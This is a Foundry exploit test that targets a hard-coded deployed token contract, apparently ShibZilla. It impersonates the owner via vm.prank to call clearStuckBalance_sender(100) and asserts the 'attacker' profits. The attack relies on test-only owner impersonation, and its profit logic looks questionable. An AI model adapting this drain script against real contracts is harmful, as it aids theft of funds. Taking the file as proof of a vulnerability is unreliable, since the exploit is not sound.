// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IShibZilla {
    function clearStuckBalance_sender(uint256 amountPercentage) external;
    function owner() external view returns (address);
    function getOwner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD00A7EdD637B776eC5a6461F5e7ac055F14a0C1E;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
        // The test framework already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // First, we need to get the owner address
        // From the constructor, we can see the owner is msg.sender at deployment
        // But we need to find the actual owner on-chain
        // Let's check the owner storage slot
        // Based on Auth contract layout, owner is at slot 0
        bytes32 ownerSlot = vm.load(TARGET, bytes32(uint256(0)));
        address contractOwner = address(uint160(uint256(ownerSlot)));

        console.log("Contract owner:", contractOwner);

        // Send some BNB to the target contract so it has balance to drain
        deal(TARGET, 10 ether);

        uint256 attackerBalanceBefore = address(this).balance;

        // Impersonate the owner and call the vulnerable function
        vm.startPrank(contractOwner);

        // Call clearStuckBalance_sender with 100 to drain 100% of contract BNB
        // We need to create an interface to call the function
        IShibZilla target = IShibZilla(TARGET);
        target.clearStuckBalance_sender(100);

        vm.stopPrank();

        uint256 attackerBalanceAfter = address(this).balance;

        console.log("Attacker balance before:", attackerBalanceBefore);
        console.log("Attacker balance after:", attackerBalanceAfter);
        console.log("Profit:", attackerBalanceAfter - attackerBalanceBefore);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
